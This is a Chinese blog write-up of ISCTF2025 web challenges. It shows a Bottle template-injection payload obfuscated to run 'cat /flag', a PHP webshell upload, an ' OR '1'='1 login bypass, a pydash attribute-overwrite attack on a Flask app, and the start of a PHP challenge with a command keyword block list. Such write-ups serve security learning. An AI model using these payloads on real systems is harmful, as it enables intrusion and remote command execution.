class="sidebar-cat-post"><a href="/posts/fbd08121/">MazeSec-Novice</a></li><li class="sidebar-cat-post"><a href="/posts/24db92f0/">MazeSec-DevOoos</a></li><li class="sidebar-cat-post"><a href="/posts/47da5ee2/">MazeSec-ajpsrv</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">OverTheWire</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/dafc866f/">OverTheWire-Bandit</a></li><li class="sidebar-cat-post"><a href="/posts/c70009a1/">OverTheWire-Natas</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">thehackerlabs</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/92742d47/">thehackerslabs-BLACKGOD</a></li><li class="sidebar-cat-post"><a href="/posts/93aa912/">thehackerslabs-Curiosity</a></li><li class="sidebar-cat-post"><a href="/posts/9e62c57a/">thehackerslabs-Curiosity3</a></li><li class="sidebar-cat-post"><a href="/posts/d94b1923/">thehackerslabs-Mentallity</a></li><li class="sidebar-cat-post"><a href="/posts/3b1290b8/">thehackerslabs-La Casa Del Jamón</a></li><li class="sidebar-cat-post"><a href="/posts/d94efc54/">thehackerslabs-Pildoritas</a></li><li class="sidebar-cat-post"><a href="/posts/273d8e90/">thehackerslabs-elcandidato</a></li><li class="sidebar-cat-post"><a href="/posts/19aecb8c/">thehackerslabs-Paella</a></li><li class="sidebar-cat-post"><a href="/posts/c36651be/">thehackerslabs-Pacharan</a></li><li class="sidebar-cat-post"><a href="/posts/2e40fc49/">thehackerslabs-Chimichurri</a></li><li class="sidebar-cat-post"><a href="/posts/e965f5ec/">thehackerslabs-Curiosity2</a></li><li class="sidebar-cat-post"><a href="/posts/8df01d3/">thehackerslabs-Big</a></li><li class="sidebar-cat-post"><a href="/posts/e23e0315/">thehackerslabs-Offensive</a></li><li class="sidebar-cat-post"><a href="/posts/a8a9f8e9/">thehackerslabs-Doraemon</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">CVE复现</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/dcc68ae8/">Thinkphp3.2.x命令执行</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">Vulnyx</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/1a843bca/">Vulnyx-Anon</a></li><li class="sidebar-cat-post"><a href="/posts/c9c80648/">Vulnyx-Eternal</a></li><li class="sidebar-cat-post"><a href="/posts/20dbae8a/">Vulnyx-Admin</a></li><li class="sidebar-cat-post"><a href="/posts/3a160b8e/">Vulnyx-Experience</a></li><li class="sidebar-cat-post"><a href="/posts/66723be2/">Vulnyx-tunnel</a></li><li class="sidebar-cat-post"><a href="/posts/b53d3c5e/">Vulnyx-send</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">Web安全</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/e9731bcd/">Weblogic漏洞</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">渗透</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/ca796a/">域控-Offensive</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">春秋云境</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/b6e8119b/">春秋云境-Brute4Road</a></li><li class="sidebar-cat-post"><a href="/posts/3a283e32/">春秋云境-Certify</a></li><li class="sidebar-cat-post"><a href="/posts/93b35a6e/">春秋云境-Delegation</a></li><li class="sidebar-cat-post"><a href="/posts/f85c7fea/">春秋云境-Flarum</a></li><li class="sidebar-cat-post"><a href="/posts/952d1a58/">春秋云境-Exchange</a></li><li class="sidebar-cat-post"><a href="/posts/f8a60ebc/">春秋云境-GreatWall</a></li><li class="sidebar-cat-post"><a href="/posts/7ea084a1/">春秋云境-Spoofing</a></li><li class="sidebar-cat-post"><a href="/posts/a5238ac2/">春秋云境-ThermalPower</a></li><li class="sidebar-cat-post"><a href="/posts/cb0f9c73/">春秋云境-Privilege</a></li><li class="sidebar-cat-post"><a href="/posts/9aa9ec9/">春秋云境-Time</a></li><li class="sidebar-cat-post"><a href="/posts/beaf5221/">春秋云境-TunnelX</a></li><li class="sidebar-cat-post"><a href="/posts/3731c1f5/">春秋云境-无间计划</a></li><li class="sidebar-cat-post"><a href="/posts/a0288562/">春秋云境-Tsclient</a></li><li class="sidebar-cat-post"><a href="/posts/aa8a0593/">春秋云境-CloudNet</a></li><li class="sidebar-cat-post"><a href="/posts/327fc326/">春秋云境-Initial</a></li><li class="sidebar-cat-post"><a href="/posts/a3698f4a/">春秋云境-Delivery</a></li><li class="sidebar-cat-post"><a href="/posts/d66aab01/">春秋云境-Hospital</a></li></ul></details></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="http://ta0.fun/posts/23ac0af4/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="ta0"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="ta0的小站"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">ISCTF2025-Writeup</h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2025-12-14 21:34:13" itemprop="dateCreated datePublished" datetime="2025-12-14T21:34:13+08:00">2025-12-14</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <time title="修改时间：2025-12-15 11:27:39" itemprop="dateModified" datetime="2025-12-15T11:27:39+08:00">2025-12-15</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="本文字数"><span class="icon iconify" data-icon="ri:file-word-line"></span></span> <span title="本文字数">11k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读时长"><span class="icon iconify" data-icon="ri:timer-line"></span></span> <span title="阅读时长">60m</span></span></span><span class="post-busuanzi"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读次数"><span class="icon iconify" data-icon="ri:eye-line"></span> <span id="busuanzi_value_page_pv"></span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/CTFWP/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">CTFWP</span></a></span></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="难过的bottle"><a href="#难过的bottle" class="headerlink" title="难过的bottle"></a>难过的bottle</h3><p>bottle框架的template SSTI</p>
<pre class="language-none"><code class="language-none">&#123;&#123; __ｉｍｐｏｒｔ__(&#39;\157\163&#39;).ｐｏｐｅｎ(&#39;\143\141\164\040\057\146\154\141\147&#39;).ｒｅａｄ() &#125;&#125;</code></pre>



<h3 id="b-by-n0t1ce-b0ard"><a href="#b-by-n0t1ce-b0ard" class="headerlink" title="b@by n0t1ce b0ard"></a>b@by n0t1ce b0ard</h3><p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251201093815.png" alt="image.png" loading="lazy"></p>
<p>注册头像传个php即可<br><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251201093836.png" alt="image.png" loading="lazy"></p>
<p>路径是&#x2F;images&#x2F;邮箱&#x2F;文件名<br><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251201093607.png" alt="image.png" loading="lazy"></p>
<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251201093900.png" alt="image.png" loading="lazy"></p>
<h3 id="whoami"><a href="#whoami" class="headerlink" title="whoami"></a>whoami</h3><p>nm等半天 靶机才打开，得排队说是<br>登录劫持type为0 可以查看源码</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>request<span class="token punctuation">,</span>render_template<span class="token punctuation">,</span>redirect<span class="token punctuation">,</span>url_for
<span class="token keyword">import</span> json
<span class="token keyword">import</span> pydash

app<span class="token operator">=</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

database<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
data_index<span class="token operator">=</span><span class="token number">0</span>
name<span class="token operator">=</span><span class="token string">''</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/register'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'register.html'</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/registerV2'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">registerV2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    username<span class="token operator">=</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>
    password<span class="token operator">=</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span>
    password2<span class="token operator">=</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'password2'</span><span class="token punctuation">]</span>
    <span class="token keyword">if</span> password<span class="token operator">!=</span>password2<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token triple-quoted-string string">'''
        &lt;script>
        alert('前后密码不一致，请确认后重新输入。');
        window.location.href='/register';
        &lt;/script>
        '''</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">global</span> data_index
        data_index<span class="token operator">+=</span><span class="token number">1</span>
        database<span class="token punctuation">[</span>data_index<span class="token punctuation">]</span><span class="token operator">=</span>username
        database<span class="token punctuation">[</span>username<span class="token punctuation">]</span><span class="token operator">=</span>password
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/user_dashboard'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">user_dashboard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'dashboard.html'</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/272e1739b89da32e983970ece1a086bd'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">A272e1739b89da32e983970ece1a086bd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'admin.html'</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/operate'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">operate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    username<span class="token operator">=</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>
    password<span class="token operator">=</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span>
    confirm_password<span class="token operator">=</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'confirm_password'</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> username <span class="token keyword">in</span> <span class="token builtin">globals</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token string">"old"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> password<span class="token punctuation">:</span>
        Username<span class="token operator">=</span><span class="token builtin">globals</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>username<span class="token punctuation">]</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            pydash<span class="token punctuation">.</span>set_<span class="token punctuation">(</span>Username<span class="token punctuation">,</span>password<span class="token punctuation">,</span>confirm_password<span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token string">"oprate success"</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token string">"oprate failed"</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"oprate failed"</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/user/name'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'username'</span><span class="token punctuation">:</span>user<span class="token punctuation">&#125;</span>

<span class="token keyword">def</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/reset'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">reset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    old_password<span class="token operator">=</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'old_password'</span><span class="token punctuation">]</span>
    new_password<span class="token operator">=</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'new_password'</span><span class="token punctuation">]</span>
    <span class="token keyword">if</span> user <span class="token keyword">in</span> database <span class="token keyword">and</span> database<span class="token punctuation">[</span>user<span class="token punctuation">]</span> <span class="token operator">==</span> old_password<span class="token punctuation">:</span>
        database<span class="token punctuation">[</span>user<span class="token punctuation">]</span><span class="token operator">=</span>new_password
        <span class="token keyword">return</span> <span class="token triple-quoted-string string">'''
        &lt;script>
        alert('密码修改成功，请重新登录。');
        window.location.href='/';
        &lt;/script>
        '''</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token triple-quoted-string string">'''
        &lt;script>
        alert('密码修改失败，请确认旧密码是否正确。');
        window.location.href='/user_dashboard';
        &lt;/script>
        '''</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/impression'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">impression</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    point<span class="token operator">=</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'point'</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>point<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">5</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"Invalid request"</span>
    List<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"&#123;"</span><span class="token punctuation">,</span><span class="token string">"&#125;"</span><span class="token punctuation">,</span><span class="token string">"."</span><span class="token punctuation">,</span><span class="token string">"%"</span><span class="token punctuation">,</span><span class="token string">"&lt;"</span><span class="token punctuation">,</span><span class="token string">">"</span><span class="token punctuation">,</span><span class="token string">"_"</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> point<span class="token punctuation">:</span>
        <span class="token keyword">if</span> i <span class="token keyword">in</span> List<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token string">"Invalid request"</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span>point<span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    username<span class="token operator">=</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>
    password<span class="token operator">=</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span>
    <span class="token builtin">type</span><span class="token operator">=</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span>
    <span class="token keyword">if</span> username <span class="token keyword">in</span> database <span class="token keyword">and</span> database<span class="token punctuation">[</span>username<span class="token punctuation">]</span> <span class="token operator">!=</span> password<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token triple-quoted-string string">'''
        &lt;script>
        alert('用户名或密码错误请重新输入。');
        window.location.href='/';
        &lt;/script>
        '''</span>
    <span class="token keyword">elif</span> username <span class="token keyword">not</span> <span class="token keyword">in</span> database<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token triple-quoted-string string">'''
        &lt;script>
        alert('用户名或密码错误请重新输入。');
        window.location.href='/';
        &lt;/script>
        '''</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">global</span> name
        name<span class="token operator">=</span>username    
        <span class="token keyword">if</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'user_dashboard'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">elif</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'A272e1739b89da32e983970ece1a086bd'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">8080</span><span class="token punctuation">,</span>debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></code></pre>

<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">operate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    username<span class="token operator">=</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>
    password<span class="token operator">=</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span>
    confirm_password<span class="token operator">=</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'confirm_password'</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> username <span class="token keyword">in</span> <span class="token builtin">globals</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token string">"old"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> password<span class="token punctuation">:</span>
        Username<span class="token operator">=</span><span class="token builtin">globals</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>username<span class="token punctuation">]</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            pydash<span class="token punctuation">.</span>set_<span class="token punctuation">(</span>Username<span class="token punctuation">,</span>password<span class="token punctuation">,</span>confirm_password<span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token string">"oprate success"</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token string">"oprate failed"</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"oprate failed"</span></code></pre>

<p>可以通过usernmae控制global属性</p>
<p>可以通过修改静态文件目录为&#x2F;<br>直接可以读flag<br>想修改<code>template_folder</code>发现不能出现old，于是修改<code>jinja_loader.searchpath</code><br>Jinja loader 是个文件系统 loader，能让你注入新的模板搜索路径。其中第1个元素是<br><code>./templates</code>路径<br>然后修改app属性<br>pydash使用.表示属性路径</p>
<pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;challenge.bluesharkinfo.com:24388&#x2F;operate?username&#x3D;app&amp;password&#x3D;jinja_loader.searchpath.0&amp;confirm_password&#x3D;&#x2F;</code></pre>

<pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;challenge.bluesharkinfo.com:24388&#x2F;impression?point&#x3D;flag</code></pre>

<h3 id="flag到底在哪"><a href="#flag到底在哪" class="headerlink" title="flag到底在哪"></a>flag到底在哪</h3><p>开局一个403，直接访问<code>robots.txt</code></p>
<pre class="language-none"><code class="language-none">User-agent: *
Disallow: &#x2F;admin&#x2F;login.php</code></pre>

<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251201103952.png" alt="image.png" loading="lazy"></p>
<p>提示username为 admin爆破密码？爆破不出来。sql注入?不是，下一题才是SQL</p>
<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251201225359.png" alt="image.png" loading="lazy"><br>偶然尝试发现会检测密码是不是<code>&#39; OR &#39;1&#39;=&#39;1</code>  sb</p>
<p>所以可以用<code>&#39; OR &#39;1&#39;=&#39;1</code>登录</p>
<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251201225433.png" loading="lazy"><br>文件上传</p>
<p>没过滤直接传</p>
<pre class="language-none"><code class="language-none">&lt;?php system($_GET[1]);</code></pre>
<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251201225636.png" alt="image.png" loading="lazy"></p>
<h3 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h3><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">FLAG</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">b</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">;</span>
            <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">b</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                <span class="token variable">$a</span><span class="token punctuation">(</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Try again!"</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$blocked_a</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'eval'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'dl'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ls'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'p'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'escape'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'er'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'str'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'cat'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'flag'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'file'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ay'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'or'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ftp'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'dict'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\.\.'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'h'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'w'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'exec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'s'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'open'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
